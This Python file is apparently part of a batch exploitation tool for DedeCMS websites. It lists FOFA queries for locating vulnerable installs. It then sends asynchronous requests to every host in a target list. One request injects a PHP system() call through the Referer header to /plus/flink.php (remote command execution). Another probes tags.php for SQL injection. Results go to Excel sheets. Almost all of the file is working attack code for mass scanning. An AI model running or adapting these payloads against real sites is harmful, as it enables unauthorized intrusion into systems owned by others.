

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    fofa: "DedeCMS_V5.8.1"
    fofa: "DedeCMS_v5.7.110"
        1. DedeCMS common.func.php 远程命令执行漏洞, DedeCMS v5.81 beta 内测版
        2. DedeCMS tags SQL注入漏洞, DedeCMS v5.7.110
    x. 退出
    ''')

def vul_flink(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': '<?php "system"(ls);?>',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6',
        'Connection': 'close'
    }
    body = ''
    method = "GET"
    path = "/plus/flink.php?dopost=save"
    notes = ""
    return (url, method, headers, body, path, notes)

def vul_tags(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    }
    body = ''
    method = "GET"
    path = "/tags.php?QUERY_STRING=/alias/NDT%27+and+1=1#"
    notes = ""
    return (url, method, headers, body, path, notes)


def run():
    OUTDIR = "result/DedeCMS"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))
    if num == 1:
        data = []
        for url in li:
            item = vul_flink(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '提示', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}DedeCMS 远程命令执行漏洞.xlsx")

    elif num == 2:
        data = []
        for url in li:
            item = vul_tags(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '提示', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}DedeCMS SQL注入漏洞.xlsx")

    else:
        print('bye....')
